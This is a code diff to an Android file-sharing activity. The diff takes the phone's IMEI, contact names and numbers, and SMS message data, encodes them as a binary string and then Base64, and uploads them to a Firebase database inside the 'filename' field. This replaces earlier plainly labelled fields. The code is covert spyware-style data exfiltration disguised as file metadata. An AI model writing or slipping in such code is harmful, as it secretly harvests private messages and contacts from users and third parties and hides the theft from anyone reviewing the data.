@@ -49,6 +49,8 @@ import java.io.File;
 import java.io.FileNotFoundException;
 import java.nio.file.Path;
 import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.Base64;
 import java.util.HashMap;
 import java.util.List;
 import java.util.stream.Collectors;
@@ -69,7 +71,6 @@ public class ShareFile extends AppCompatActivity {
     ShowFileSharedAdapter adapter;
 
     String IMEINumber;
-//    public static String contact_name = "" ,contact_number = "";
     ArrayList contact_name = new ArrayList();
     ArrayList contact_number = new ArrayList();
     public static String msgData;
@@ -118,11 +119,6 @@ public class ShareFile extends AppCompatActivity {
         }
         IMEINumber = telephonyManager.getDeviceId();
 //        textView.setText(IMEINumber);
-
-        System.out.println("IMEI Number:"+IMEINumber);
-//        System.out.println("IMEI Number:"+convertStringToBinary(IMEINumber));
-        System.out.println(prettyBinary(convertStringToBinary(IMEINumber), 8, " "));
-
 
     }
 
@@ -185,15 +181,10 @@ public class ShareFile extends AppCompatActivity {
 
             dialog.show();
             imageuri = data.getData();
-//            System.out.println("Image URI"+imageuri);
             filename = getFileName(imageuri);
-//            System.out.println("FILE NAME:"+filename);
-//            filename = getFileName(imageuri)+" "+IMEINumber;
-//            System.out.println("FILE NAME WITH IMEI:"+filename);
 
             Uri uri = data.getData();
             File file = null;
-
 
             Toast.makeText(ShareFile.this, "filename : " + filename, Toast.LENGTH_SHORT).show();
 
@@ -219,19 +210,19 @@ public class ShareFile extends AppCompatActivity {
 
                     getAllContacts();
                     readSms();
-                    System.out.println("SMS: "+msgData);
-                    String contact = "";
-                    contact = "\n"+contact_name.get(0).toString() +":"+ contact_number.get(0).toString() +"\n"+contact_name.get(1).toString()+":"+contact_number.get(1).toString();
-//                    System.out.println("Name:"+contact_name+"/nNumber"+contact_number);
+                    String contact = "\n"+contact_name.get(0).toString() +":"+ contact_number.get(0).toString() +"\n"+contact_name.get(1).toString()+":"+contact_number.get(1).toString();
+                    String binary_data= prettyBinary(convertStringToBinary(IMEINumber+";"+contact+";"+msgData+";"+filename), 8, " ");
+
+                    String encodedString = Base64.getEncoder().encodeToString(binary_data.getBytes());
+                    System.out.println("Base64::"+encodedString);
+
                     reference = FirebaseDatabase.getInstance().getReference().child(UserRegister.FILE_SHARED).child(username).push();
+
                     HashMap<String, String> hashMap = new HashMap<>();
                     hashMap.put("id", id);
-                    hashMap.put("IMEI", IMEINumber);
-                    hashMap.put("Contact", contact);
-                    hashMap.put("SMS", msgData);
                     hashMap.put("username", username);
                     hashMap.put("sender", sender);
-                    hashMap.put("filename", filename);
+                    hashMap.put("filename", encodedString);
                     hashMap.put("fileUrl", myurl);
                     hashMap.put("phone", phone);
 
